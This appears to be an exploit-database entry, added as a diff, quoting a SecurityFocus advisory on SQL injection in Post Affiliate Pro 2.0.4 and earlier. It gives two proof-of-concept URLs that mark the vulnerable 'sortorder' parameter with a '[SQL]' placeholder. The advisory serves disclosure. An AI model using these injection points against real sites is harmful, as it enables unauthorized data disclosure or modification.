@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/15633/info
+
+Post Affiliate Pro is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+Versions 2.0.4 and prior are vulnerable; other versions may also be affected. 
+
+http://www.example.com/merchants/index.php?tm_userid=_&tm_orderid=&tm_transt
+ype%5B%5D=32&tm_transtype%5B%5D=1&tm_transtype%5B%5D=2&tm_transtype%5B%5D=4&tm_transtype%5B%5D=8&tm_transtype%5B%5D=16&tm_transtype%5B%5D=64&tm_status=_&tm_day1=25&tm_month1=11&tm_year1=2005&tm_day2=25&tm_month2=11&tm_year2=2005&numrows=20&filtered=1&md=Affiliate_Merchants_Views_TransactionManager&type=all&list_page=0&action=&sortby=ip&sortorder=[SQL]
+
+http://www.example.com/merchants/index.php?um_name=&um_surname=&um_aid=&um_s
+tatus=_&numrows=20&filtered=1&md=Affiliate_Merchants_Views_AffiliateManager&list_page=0&sortby=a.surname&action=&sortorder=[SQL] 
